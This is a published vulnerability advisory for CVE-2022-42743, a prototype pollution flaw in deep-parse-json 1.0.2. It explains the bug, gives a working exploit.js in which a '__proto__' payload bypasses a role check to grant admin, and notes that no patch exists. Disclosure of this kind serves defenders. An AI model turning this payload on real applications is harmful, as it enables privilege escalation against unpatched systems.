---
slug: advisories/buuren/
title: deep-parse-json 1.0.2 - Prototype Pollution
authors: Carlos Bello
writer: cbello
codename: buuren
product: deep-parse-json 1.0.2 - Prototype Pollution
date: 2022-10-19 15:00 COT
cveid: CVE-2022-42743
severity: 7.3
description: deep-parse-json 1.0.2     -    Prototype Pollution
keywords: Fluid Attacks, Security, Vulnerabilities, Deep Parse Json, Prototype Pollution
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | deep-parse-json 1.0.2 - Prototype Pollution                        |
| **Code name**         | [Buuren](https://en.wikipedia.org/wiki/Armin_van_Buuren)           |
| **Product**           | deep-parse-json                                                    |
| **Affected versions** | Version 1.0.2                                                      |
| **State**             | Public                                                             |
| **Release date**      | 2022-10-19                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Prototype Pollution                                                                                                         |
| **Rule**              | [390. Prototype Pollution](https://docs.fluidattacks.com/criteria/vulnerabilities/390)                                      |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L                                                                                |
| **CVSSv3 Base Score** | 7.3                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2022-42743](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42743)                                             |

## Description

Version 1.0.2 of deep-parse-json allows an external attacker to edit
or add new properties to an object. This is possible because the
application does not correctly validate the incoming JSON keys, thus
allowing the `__proto__` property to be edited.

## Vulnerability

Prototype pollution is a vulnerability that affects JS. It occurs when
a third party manages to modify the `__proto__` of an object. JavaScript
first checks if such a method/attribute exists in the object. If so,
then it calls it. If not, it looks in the object's prototype. If the
method/attribute is also not in the object's prototype, then the
property is said to be undefined.

Therefore, if an attacker succeeds in injecting the `__proto__` property
into an object, he will succeed in injecting or editing its properties.

## Exploitation

### exploit.js

```js
const { deepParseJson } = require('deep-parse-json')

let admin = {name: "admin", role:"admin"};
let user  = {name: "user", role:"user"};

let normal_user_request    = JSON.parse('{"name":"user","role":"admin"}');
let malicious_user_request = JSON.parse('{"name":"user","__proto__":{"role":"admin"}}');

const create_user = (new_user) => {
    // A user cannot alter his role. This way we prevent privilege escalations.
    if(new_user?.role && new_user?.role.toLowerCase() === "admin") {
        throw "Unauthorized Action";
    }
    user = deepParseJson(new_user, user);
    console.log(user?.role);
}

try {
    create_user(normal_user_request);
} catch (error) {
    console.log(error);
}
finally {
    create_user(malicious_user_request);
}
```

## Evidence of exploitation

![Prototype-Pollution](https://user-images.githubusercontent.com/51862990/196779711-510dd9cf-35b6-413c-8498-b3dc6b283a42.png)

## Our security policy

We have reserved the CVE-2022-42743 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: deep-parse-json 1.0.2

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/sibu-github/deep-parse-json>

## Timeline

<time-lapse
  discovered="2022-10-06"
  contacted="2022-10-06"
  replied="2022-10-06"
  confirmed=""
  patched=""
  disclosure="2022-10-19">
</time-lapse>
